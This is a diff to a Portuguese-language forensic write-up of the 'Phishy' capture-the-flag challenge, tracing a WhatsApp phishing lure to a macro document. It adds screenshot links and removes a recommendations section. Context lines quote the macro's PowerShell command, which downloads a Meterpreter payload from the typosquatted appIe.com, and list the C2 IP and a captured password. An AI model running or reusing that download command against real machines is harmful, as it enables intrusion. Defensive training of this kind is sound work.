@@ -52,6 +52,8 @@ Owner:                 Windows User
 
 O campo **Name** identificado como `WIN-NF3IQEU4G0T` é o hostname da máquina vítima, confirmado pelo campo **Source** como `Recent Activity`.
 
+![Nome da Maquina](/Forensic/Phishy/images/Hostname_Machine_Victim(1).png)
+
 ---
 
 ### Q2 — Qual é o aplicativo de mensagens instalado na máquina vítima?
@@ -66,6 +68,8 @@ LogicalFileSet1/Phishy/Users/Semah/AppData/Roaming/WhatsApp/Databases/
 
 contendo os bancos de dados `msgstore.db`, `wa.db`, `payments.db`, `stickers.db` e demais arquivos do **WhatsApp**. O **WhatsApp Viewer** integrado ao Autopsy exibiu o histórico de mensagens entre a vítima (`Semah`) e o número `+21698231645`, no qual o atacante enviou o link do documento malicioso disfarçado de uma promoção de iPhone 12 — confirmando o **WhatsApp** como o vetor de entrega do ataque.
 
+![Aplicativo de Mensagem](/Forensic/Phishy/images/Menssage_App(2).png)
+
 ---
 
 ### Q3 — O atacante induziu a vítima a baixar um documento malicioso. Forneça a URL completa de download.
@@ -79,6 +83,8 @@ contendo os bancos de dados `msgstore.db`, `wa.db`, `payments.db`, `stickers.db`
 ```
 
 A URL completa de download do documento malicioso é **`http://apple.com/IPhone-Winners.doc`**.
+
+![URL Maliciosa](/Forensic/Phishy/images/URL_to_Download_Phishing(3).png)
 
 ---
 
@@ -105,6 +111,8 @@ C:\Users\ForenseAnalyst\Downloads> python oledump.py IPhone-Winners.doc
 
 Os streams marcados com **'M'** (Macro) são o stream **9** (`eviliphone`, 1170 bytes) e o stream **10** (`iphoneevil`, 5581 bytes). O maior índice entre os streams com macros é o **stream 10**.
 
+![Comando Macro](/Forensic/Phishy/images/Highest_Command_if_Macro(4).png)
+
 ---
 
 ### Q5 — A macro executou um programa. Qual é o nome do programa?
@@ -126,6 +134,8 @@ para executar o comando PowerShell construído.
 
 O VirusTotal confirma: a macro `iphoneevil.bas` usa `WScript.Shell.Run()` para executar um comando **PowerShell**, com detecções incluindo as famílias `downloader.emodidr/heur2` e `w97m`.
 
+![Nome do Programa](/Forensic/Phishy/images/Program_Used_is_PowerShell(5).png)
+
 ---
 
 ### Q6 — A macro baixou um arquivo malicioso. Forneça a URL completa de download.
@@ -140,6 +150,8 @@ invoke-webrequest -Uri 'http://appIe.com/IPhone.exe' -OutFile 'C:\Temp\IPhone.ex
 
 A URL de download do payload malicioso é **`http://appIe.com/IPhone.exe`**. Note o **typosquatting**: a letra `l` minúscula em "apple" foi substituída por `I` maiúsculo (`appIe.com`), tornando o domínio visualmente idêntico a `apple.com` na maioria das fontes.
 
+![URL Macro](/Forensic/Phishy/images/Downloaded_URL(6).png)
+
 ---
 
 ### Q7 — Para onde o arquivo malicioso foi baixado? (Forneça o caminho completo)
@@ -153,6 +165,8 @@ invoke-webrequest -Uri 'http://appIe.com/IPhone.exe' -OutFile 'C:\Temp\IPhone.ex
 ```
 
 O parâmetro **`-OutFile 'C:\Temp\IPhone.exe'`** indica que o payload é salvo no diretório `C:\Temp\` da máquina vítima com o nome `IPhone.exe`. O Autopsy confirmou a presença do arquivo nos Downloads da vítima com o hash MD5 correspondente ao arquivo analisado no VirusTotal.
+
+![Local de Download na Maquina](/Forensic/Phishy/images/Malicious_File_Output(7).png)
 
 ---
 
@@ -174,6 +188,8 @@ Detecções relevantes:
 
 O rótulo **`meterpreter`** e a classificação **`Windows.Trojan.Metasploit`** confirmam que o payload foi gerado pelo framework **Metasploit**, especificamente utilizando o stager **Meterpreter** para estabelecer comunicação reversa com o C2 do atacante.
 
+![Framework](/Forensic/Phishy/images/Framework_Used_in_Malware(8).png)
+
 ---
 
 ### Q9 — Qual é o endereço IP do atacante?
@@ -192,6 +208,8 @@ Memory Pattern IPs
 ```
 
 O endereço **`155.94.69.27`** é o servidor **C2 (Command and Control)** do atacante — o IP para o qual o Meterpreter estabelece a sessão reversa após a execução do payload na máquina vítima. O hostname estático `ip-155-94-69-27-static.hsip.as19531.net` identifica o bloco como pertencente ao AS19531.
+
+![IP do Atacante](/Forensic/Phishy/images/Attacker_IP_Address(9).png)
 
 ---
 
@@ -215,6 +233,8 @@ visit_count: 125
 
 O alto `visit_count` (125 visitas) e o domínio `apple.competitions.com` — que imita a Apple mas não é domínio oficial — confirmam que esta é a **página de login falsa** utilizada para coletar as credenciais da vítima.
 
+![URL fake](/Forensic/Phishy/images/Fake_GiveAway_Login_Page(10).png)
+
 ---
 
 ### Q11 — Qual é a senha que o usuário submeteu à página de login?
@@ -236,6 +256,8 @@ Password Use Count:   1
 ```
 
 A senha **`GacsriIeUZMY4xdAF4yj`** foi submetida pela vítima `Semah` na página de login falsa em **30/04/2021 às 03:28**, coincidindo com o período do ataque documentado no histórico de navegação (`apple.competitions.com/login.php`, 125 visitas).
+
+![Senha](/Forensic/Phishy/images/Password_Login_Page(11).png)
 
 ---
 
@@ -338,18 +360,6 @@ A senha **`GacsriIeUZMY4xdAF4yj`** foi submetida pela vítima `Semah` na página
 
 ---
 
-## 🛡 Recomendações
-
-- **Bloquear os IoCs** — domínios `appIe.com`, `apple.competitions.com` e IP `155.94.69.27` no firewall perimetral e no DNS
-- **Desativar macros automaticamente** via Group Policy (GPO) para documentos baixados da internet (`Block macros from running in Office files from the internet`)
-- **Isolar a máquina `WIN-NF3IQEU4G0T`** e realizar análise dinâmica completa, seguida de reimagem — o Meterpreter pode ter estabelecido persistência
-- **Implementar regras IDS/IPS** para detecção de tráfego Meterpreter (Snort/Suricata — rule TAG_LOG_PKT identificada pelo VT Behavior)
-- **Revogar e redefinir** as credenciais da conta Apple de `Semah` (`GacsriIeUZMY4xdAF4yj`) e habilitar 2FA imediatamente
-- **Reportar o número `+21698231645`** ao WhatsApp (abuse@whatsapp.com) para bloqueio da conta do atacante
-- **Treinar usuários** sobre phishing via WhatsApp — kits que imitam marcas conhecidas (Apple, sorteios) são vetores crescentes de comprometimento
-
----
-
 ## 📚 Referências
 
 - [CyberDefenders — Phishy CTF](https://cyberdefenders.org/blueteam-ctf-challenges/phishy/)
@@ -363,5 +373,3 @@ A senha **`GacsriIeUZMY4xdAF4yj`** foi submetida pela vítima `Semah` na página
 - [MITRE ATT&CK T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)
 
 ---
-
-*Writeup elaborado por Mauricio Robert — Faculdade Impacta | Junho 2026*
